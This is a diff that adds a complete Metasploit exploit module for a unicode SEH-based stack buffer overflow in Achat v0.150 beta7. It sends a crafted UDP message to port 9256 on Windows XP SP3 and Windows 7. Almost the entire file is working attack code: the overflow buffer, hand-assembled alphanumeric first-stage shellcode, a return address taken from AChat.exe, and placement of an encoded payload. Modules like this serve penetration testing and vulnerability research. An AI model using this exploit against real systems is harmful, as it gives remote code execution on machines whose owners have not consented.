@@ -1,0 +1,131 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Udp
+  include Msf::Exploit::Remote::Seh
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Achat v0.150 beta7 Buffer Overflow',
+      'Description'    => %q{
+        This module exploits an unicode SEH based stack buffer overflow in Achat v0.150. By
+        sending a crafted message to the default port 9256 it's possible to overwrites the
+        SEH handler. Even when the exploit is reliable it depends of timing since there are
+        two threads overflowing the stack in the same time. This module has been tested on
+        Windows XP SP3 and Windows 7.
+      },
+      'Author'         =>
+        [
+          'Peter Kasza <peter.kasza[at]itinsight.hu>', # Vulnerability discovery
+          'Balazs Bucsay <balazs.bucsay[at]rycon.hu>' # Exploit, Metasploit module
+        ],
+      'License'	       => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CWE', '121'],
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'process'
+        },
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+          'Space'    => 730,
+          'BadChars' => "\x00" + (0x80..0xff).to_a.pack("C*"),
+          'StackAdjustment' => -3500,
+          'EncoderType'    => Msf::Encoder::Type::AlphanumUnicodeMixed,
+          'EncoderOptions'  =>
+            {
+              'BufferRegister' => 'EAX'
+            }
+        },
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          # Tested OK Windows XP SP3, Windows 7
+          # Not working on Windows Server 2003
+          [ 'Achat beta v0.150 / Windows XP SP3 / Windows 7 SP1', { 'Ret' => "\x2A\x46" } ] #ppr from AChat.exe
+        ],
+      'Privileged'     => false,
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Dec 18 2014'))
+
+    register_options(
+      [
+        Opt::RPORT(9256)
+      ], self.class)
+  end
+
+  def exploit
+    connect_udp
+
+    # 0055 00          ADD BYTE PTR SS:[EBP],DL # padding
+    # 2A00             SUB AL,BYTE PTR DS:[EAX] # padding
+    # 55               PUSH EBP                 # ebp holds a close pointer to the payload
+    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding
+    # 58               POP EAX                  # mov eax, ebp
+    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding
+    # 05 00140011      ADD EAX,11001400         # adjusting eax
+    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding
+    # 2D 00130011      SUB EAX,11001300         # lea eax, eax+100
+    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding
+    # 50               PUSH EAX                 # eax points to the start of the shellcode
+    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding
+    # 58               POP EAX                  # padding
+    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding
+    # 59               POP ECX                  # padding
+    # 0039             ADD BYTE PTR DS:[ECX],BH # padding
+    first_stage = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
+
+    sploit = 'A0000000002#Main' + "\x00" + 'Z' * 114688 + "\x00" + "A" * 10 + "\x00"
+    sploit << 'A0000000002#Main' + "\x00" + 'A' * 57288 + 'AAAAASI' * 50 + 'A' * (3750 - 46)
+    sploit << "\x62" + 'A' * 45 # 0x62 will be used to calculate the right offset
+    sploit << "\x61\x40" # POPAD + INC EAX
+
+    sploit << target.ret # AChat.exe p/p/r address
+
+    # adjusting the first thread's unicode payload, tricky asm-fu
+    # the first seh exception jumps here, first_stage variable will be executed
+    # by the second seh exception as well. It needs to be in sync with the second
+    # thread, so that is why we adjust eax/ebp to have a close pointer to the
+    # payload, then first_stage variable will take the rest of the job.
+    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding
+    # 55               PUSH EBP                 # ebp with close pointer to payload
+    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding
+    # 58               POP EAX                  # put ebp to eax
+    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding
+    # 2A00             SUB AL,BYTE PTR DS:[EAX] # setting eax to the right place
+    # 2A00             SUB AL,BYTE PTR DS:[EAX] # adjusting eax a little bit more
+    # 05 00140011      ADD EAX,11001400         # more adjusting
+    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding
+    # 2D 00130011      SUB EAX,11001300         # lea eax, eax+100
+    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding
+    # 50               PUSH EAX			# saving eax
+    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding
+    # 5D               POP EBP			# mov ebp, eax
+    sploit << "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + 'C' * 9 + "\x60\x43"
+    sploit << "\x61\x43" + target.ret # second nseh entry, for the second thread
+    sploit << "\x2A" + first_stage + 'C' * (157 - first_stage.length - 31 -3) # put address of the payload to EAX
+    sploit << payload.encoded + 'A' * (1152 - payload.encoded.length) # placing the payload
+    sploit << "\x00" + 'A' * 10 + "\x00"
+
+    i = 0
+    while i < sploit.length do
+      if i > 172000
+        Rex::sleep(1.0)
+      end
+      sent = udp_sock.put(sploit[i..i + 8192 - 1])
+      i += sent
+    end
+    disconnect_udp
+  end
+
+end
